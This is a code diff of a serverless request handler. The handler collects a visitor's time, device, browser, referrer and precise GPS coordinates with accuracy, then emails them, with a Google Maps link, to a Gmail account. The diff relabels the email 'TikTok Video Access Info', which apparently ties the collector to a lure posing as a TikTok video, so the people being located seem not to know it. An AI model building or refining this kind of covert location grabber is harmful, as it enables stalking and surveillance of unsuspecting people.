@@ -4,7 +4,7 @@ export default async function handler(req, res) {
   if (req.method !== "POST") return res.status(405).send("Only POST allowed");
 
   try {
-    const { timestamp, osVersion, latitude, longitude } = req.body || {};
+    const { timestamp, osVersion, browser, referrer, latitude, longitude, accuracy } = req.body || {};
 
     const user = process.env.GMAIL_USER;
     const pass = process.env.GMAIL_APP_PASSWORD;
@@ -21,10 +21,12 @@ export default async function handler(req, res) {
 
     let text =
       `Time: ${timestamp}\n` +
-      `Device: ${osVersion}\n`;
+      `Device: ${osVersion}\n` +
+      `Browser: ${browser}\n` +
+      `Referrer: ${referrer}\n`;
 
     if (latitude && longitude) {
-      text += `Latitude: ${latitude}\nLongitude: ${longitude}\n` +
+      text += `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\n` +
               `Map: https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}\n`;
     } else {
       text += "Location: Not provided\n";
@@ -33,7 +35,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: user,
       to,
-      subject: "Time, Device & Location Info",
+      subject: "TikTok Video Access Info",
       text
     });
 
